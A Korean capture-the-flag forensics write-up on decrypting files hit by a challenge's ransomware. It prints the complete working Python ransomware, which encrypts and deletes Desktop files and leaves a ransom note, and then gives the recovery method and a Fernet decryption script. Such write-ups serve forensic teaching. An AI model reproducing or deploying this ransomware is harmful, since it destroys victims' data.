# Get-Flag-From-Space 

# Usage
- 2024.03#

# Concept
- Ransomware
- Notepad

# Writeup

본 문제에 사용된 랜섬웨어 파일의 원본 소스코드는 아래와 같습니다. 

####  BubboleBobble-python.py

import os
import base64
from cryptography.fernet import Fernet
import getpass

print('Ransomware Runing (No Remove!) ')

try:
    # Scan Files
    def scan(path):
        allFiles = []
        for home, sub_files, file_list_s in os.walk(path):
            for name_files in file_list_s:
                if 'space' in name_files:
                    continue
                allFiles.append(os.path.join(home, name_files))
        return allFiles

    username = getpass.getuser()
    print(username)
    #Path Files
    path_files = 'C:\\Users\\' +username+ '\\Desktop'

    key_fernet_start = Fernet.generate_key()

    #Encryption
    num = 0
    openFiles = scan(path_files)
    for file_os in openFiles:
        #Read Files
        files = open(file_os, "rb")
        Data_Text = files.read()
        files.close()

        #Files Remove 
        os.remove(file_os)
        
        # Fernet
        fernet_start = Fernet(key_fernet_start)
        encodedBytes = fernet_start.encrypt(Data_Text)
        encodedStr = str(encodedBytes,"utf-8")
        
        # Write Files
        output = os.path.join(os.path.dirname(file_os), os.path.basename(file_os) + '.space')
        files2 = open(output, "w")
        files2.write(encodedStr)
        num += 1

    # Note
        num2 = 0
        for dirName, subdirList, fileList in os.walk(path_files):
            OutputFile = os.path.join(os.path.join(dirName),f"Read_ME.txt")
            file = open(OutputFile,'w')
            file.write('''Attention maybe you have been infected by Space-Ransomware!

        All your file have been overwrite by Encryption Fernet

        Don't worry, you can return all your files!

        The only method of recovering files is to purchase decrypt tool and unique key for you.
        This software will decrypt all your encrypted files.
        To get this software you need write on our e-mail below

        What guarantees do we give to you?
        Its just a business. We absolutely do not care about you and your deals, except getting benefits.

        Ransomware Make By Space-Boy

        <--------- Rule
        DONT try to change files by yourself, DONT use any third party software for restoring your data.
        Do not rename encrypted files.

        Contact us:space@onion.mail

        Send $010-1111-1111 worth of Space Coin to this Address:
        1111-1111-1111-1111

        Logs Ransomware --------------->
        Personal Ransomware ID: bY1yUCdKYs8gQ9YzakB1JSRpx37xCAapQIz6alFOp1p1PGnQzcGuIxUD4YR0gISNoThUZ4jx7nATPW9IePHtpzCJporR_93758072677
        Encryption Path:'C:\\Users\\Administrator'
        File Extension: space
        <--------------- Logs Ransomware
        ''')
            file.close()
            num2 += 1

    print("Ransomware Runing Done!!!!!!")

except:
    pass

본 문제는 랜섬웨어에 감염된 파일을 복호화하는 문제입니다.
일반적으로 랜섬웨어에 감염되면, 공격 대상은 랜섬 노트를 통해 공격자와 컨택하여 복호화 키 또는 원본 파일을 획득할 수 있습니다. 

본 문제는 피해자가 당황하여 랜섬노트를 삭제한 케이스였지만 아래와 같은 방법으로 플래그를 획득할 수 있습니다. 

1. 파일시스템 로그
파일시스템 로그에서 확보 가능한 랜섬노트 파일명을 통해 랜섬 노트를 메모장으로 열었다고 추정할 수 있습니다. 따라서 win11 부터 남는 메모장 캐시 경로로 가서 랜섬노트 내용을 확인할 수 있습니다. 랜섬노트 내용에서 fernet으로 암호화되었다는 점과 공격자 이메일 주소를 획득할 수 있습니다.
또한 파일시스템 로그를보면 랜섬웨어 감염 시점에 뜬금없이 C드라이브 하위에 폴더와 desktop.ini 파일이 생기는 것을 볼 수 있습니다. 해당 파일 내용 확인을 통해 랜섬웨어 복호화키가 해당 경로에 드롭되는 것을 추정하고 복호화 코드 구현이 가능합니다. 

2. 크롬 히스토리를 통한 랜섬웨어 원인 진단
피해자는 불법 자료 공유 카페에서 게임 압축 파일을 다운로드 받았으며, 이로 인해 랜섬웨어에 감염됩니다. 압축 파일에 패스워드가 걸려있으며 크랙 코드를 짜거나 크랙 도구를 이용해 랜섬웨어 파일을 획득할 수 있습니다. 해당 실행 파일을 디컴파일하면 랜섬노트 내용과 복호화키를 특정 경로에 드랍하는 코드 내용을 볼 수 있습니다. 


#### ex.py

from cryptography.fernet import Fernet

def decrypt_file(encrypted_file_path, key):
    with open(encrypted_file_path, 'rb') as f:
        encrypted_data = f.read()
    
    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(encrypted_data)

    decrypted_file_path = encrypted_file_path[:-6]
    with open(decrypted_file_path, 'wb') as f:
        f.write(decrypted_data)

encrypted_file_path = "Flag_is_Here.xlsx.space"
key = b'f7ZBaAeSShZQltlmcTzcHQwnCMCQkJ__Z1rpK0nTHfs='

decrypt_file(encrypted_file_path, key)


